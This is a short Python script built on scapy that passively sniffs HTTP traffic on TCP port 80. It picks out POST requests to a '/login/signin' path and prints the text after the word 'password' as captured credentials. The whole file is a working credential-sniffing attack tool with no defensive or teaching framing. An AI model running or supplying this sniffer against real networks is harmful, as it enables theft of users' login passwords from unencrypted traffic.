from scapy.all import *
from scapy.layers.inet import TCP


def packet_callback(packet):
    # Check if the packet payload exists
    if packet[TCP].payload:
        # Convert payload to a string
        data = str(packet[TCP].payload)

        # Check if the payload contains the desired HTTP request and 'password'
        if 'POST /login/signin' in data and 'password' in data:
            # if 'POST ' and 'signin' in data and 'password' in data:
            # Find the index of 'password' in the payload
            password_index = data.find('password')

            # Check if there are at least 19 characters after 'password'
            if password_index < len(data) - 19:
                # Extract the password and the following 19 characters
                password = data[password_index:password_index + 19]
                print(f'Captured Password: {password}')
            elif password_index != -1:
                # Extract the password until the end of the payload
                password = data[password_index:]
                print(f'Captured Password: {password}')


print("Sniffing started...")
# Sniff packets on the network interface
sniff(filter="tcp port 80", prn=packet_callback, store=0)
